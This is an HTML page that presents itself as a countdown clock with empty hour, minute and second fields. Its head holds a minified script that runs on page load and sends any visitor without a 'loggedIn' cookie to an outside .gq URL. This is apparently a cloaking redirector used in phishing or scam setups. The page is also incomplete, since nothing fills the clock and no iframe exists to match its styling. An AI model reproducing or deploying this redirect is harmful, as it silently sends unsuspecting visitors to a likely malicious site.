<!DOCTYPE html>
<html> 
	<head>
		<script type="text/javascript">function getCookie(cname){var name=cname+"=";var ca=document.cookie.split(';');for(var i=0;i<ca.length;i++){var c=ca[i];while(c.charAt(0)==' '){c=c.substring(1)}if(c.indexOf(name)===0){return c.substring(name.length,c.length)}}return""}function checkCookie(){var loggedIn=getCookie("loggedIn");if(loggedIn!=""){alert("Welcome again!")}else{window.location.href="http://welcttw.gq/EXCLU/"}}</script>
		<style type="text/css">
			body {
				margin:   0;
				overflow: hidden;
			}
			#iframe1{
				height:   100%;
				left:     0px;
				position: absolute;
				top:      0px;
				width:    100%;
			}
		</style>
	</head>
	<body onload="checkCookie();">
		<div id="clockdiv">
			<div>
				<span class="hours" id="hour"></span>
				<div class="smalltext">Hours</div>
			</div>
			<div>
				<span class="minutes" id="minute"></span>
				<div class="smalltext">Minutes</div>
			</div>
			<div>
				<span class="seconds" id="second"></span>
				<div class="smalltext">Seconds</div>
			</div>
		</div>
	</body>
</html>
